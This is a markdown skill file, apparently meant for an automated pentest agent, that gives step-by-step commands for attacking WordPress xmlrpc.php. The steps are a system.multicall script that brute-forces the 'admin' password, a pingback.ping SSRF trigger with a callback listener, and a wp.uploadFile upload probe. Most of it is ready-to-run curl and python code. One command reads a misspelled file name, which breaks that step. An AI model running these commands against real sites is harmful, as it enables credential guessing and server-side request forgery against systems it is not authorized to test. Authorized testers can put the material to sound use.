---
name: xmlrpc-deep
description: XMLRPC brute force, SSRF, and file upload exploitation
version: 1.0.0
phase: recon
category: discovery
tags: [xmlrpc, wordpress, brute-force, ssrf, web]
tools: [curl, python3]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: high
related_skills:
  - wordpress-mass-recon
mitre_attack:
  - T1110
  - T918
---

## When to Use

- WordPress target with xmlrpc.php accessible
- Testing brute force amplification via system.multicall
- Hunting SSRF via pingback.ping
- Testing wp.uploadFile for unauthorized upload

## Prerequisites

- curl and python3 installed
- Network access to target xmlrpc.php endpoint
- Valid username list for brute force testing

## Procedure

### 1. Verify XMLRPC is Enabled

```bash
curl -s "https://TARGET/xmlrpc.php" | head -30
# Should return XML listing supported methods
```

### 2. List Supported Methods

```bash
curl -s -X POST "https://TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall>
  <methodName>system.listMethods</methodName><params></params>
</methodCall>'
```

### 3. system.multicall Brute Force Amplification

```bash
# Generate multicall payload (20 passwords per request)
python3 -c "
import xml.etree.ElementTree as ET
passwords = ['admin','password','123456','wordpress','letmein',
             'welcome','abc123','password1','qwerty','admin123']
root = ET.Element('methodCall')
ET.SubElement(root, 'methodName').text = 'system.multicall'
params = ET.SubElement(root, 'params')
param = ET.SubElement(params, 'param')
value = ET.SubElement(param, 'value')
struct = ET.SubElement(value, 'struct')
for i, pwd in enumerate(passwords):
    member = ET.SubElement(struct, 'member')
    ET.SubElement(member, 'name').text = f'call{i}'
    mval = ET.SubElement(member, 'value')
    mc = ET.SubElement(mval, 'methodCall')
    ET.SubElement(mc, 'methodName').text = 'wp.getUsersBlogs'
    mparams = ET.SubElement(mc, 'params')
    mp = ET.SubElement(mparams, 'param')
    mv = ET.SubElement(mp, 'value')
    ms = ET.SubElement(mv, 'struct')
    for n, v in [('username','admin'),('password',pwd)]:
        m = ET.SubElement(ms, 'member')
        ET.SubElement(m, 'name').text = n
        mv2 = ET.SubElement(m, 'value')
        ET.SubElement(mv2, 'string').text = v
print(ET.tostring(root, encoding='unicode'))
" > multicall_payload.xml

curl -s -X POST "https://TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d @multocall_payload.xml | grep -E "faultCode|struct"
```

### 4. Pingback SSRF Detection

```bash
# Start listener, then trigger pingback
python3 -c "
import http.server, threading
def handler(r, *_): r.send_response(200); r.end_headers()
http.server.HTTPServer(('0.0.0.0',8888),handler).handle_request()
" &

curl -s -X POST "https://TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall>
  <methodName>pingback.ping</methodName><params>
    <param><value><string>http://YOUR_IP:8888</string></value></param>
    <param><value><string>https://TARGET/</string></value></param>
  </params></methodCall>'
```

### 5. wp.uploadFile Test

```bash
curl -s -X POST "https://TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall>
  <methodName>wp.uploadFile</methodName><params>
    <param><value><int>1</int></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>test.txt</string></value></member>
      <member><name>type</name><value><string>text/plain</string></value></member>
      <member><name>bits</name><value><base64>dGVzdA==</base64></value></member>
    </struct></value></param>
    <param><value><struct><member><name>name</name>
      <value><string>test</string></value></member></struct></value></param>
  </params></methodCall>'
```

## OPSEC Rules

- Limit multicall to 20 passwords per request (amplification is loud)
- Pingback SSRF from YOUR infrastructure only — never use victim servers
- Do not upload files during recon without authorization
- All XMLRPC traffic is logged by WAFs — expect detection

## Verification

```bash
curl -s -X POST "https://TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  | grep -c "method"
```

## Pitfalls

- WordPress 5.6+ may disable xmlrpc by default
- WAFs rate-limit XMLRPC aggressively after 3-5 requests
- pingback.ping requires target to fetch YOUR URL (firewalls may block)
- wp.uploadFile requires valid auth credentials

## Output Format

```json
{
  "target": "https://TARGET/xmlrpc.php",
  "methods_enabled": ["system.multicall", "pingback.ping", "wp.uploadFile"],
  "brute_force_possible": true,
  "ssrf_possible": true,
  "file_upload_possible": false,
  "severity": "high"
}
```
